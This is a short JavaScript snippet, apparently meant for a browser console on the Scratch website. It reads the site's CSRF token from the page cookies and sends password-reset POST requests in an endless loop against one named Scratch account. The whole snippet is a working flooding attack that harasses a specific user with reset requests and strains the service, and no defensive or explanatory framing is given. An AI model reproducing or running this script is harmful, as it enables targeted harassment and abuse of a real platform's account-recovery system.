while (!0) {
const parseCookies = () => {
  return document.cookie
    .split(';')
    .map(cookie => cookie.split('='))
    .reduce((acc, [key, value]) => {
      if (key && value) {
        acc[decodeURIComponent(key.trim())] = decodeURIComponent(value.trim());
      }
      return acc;
    }, {});
};
const cukie = parseCookies();
await fetch("https://scratch.mit.edu/accounts/password_reset/", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8,zh-CN;q=0.7,zh;q=0.6,eo;q=0.5",
    "content-type": "application/x-www-form-urlencoded",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://scratch.mit.edu/accounts/password_reset/",
  "body": `csrfmiddlewaretoken=${cukie.scratchcsrftoken}&username=-AnnamAnimation-&email=`,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
}
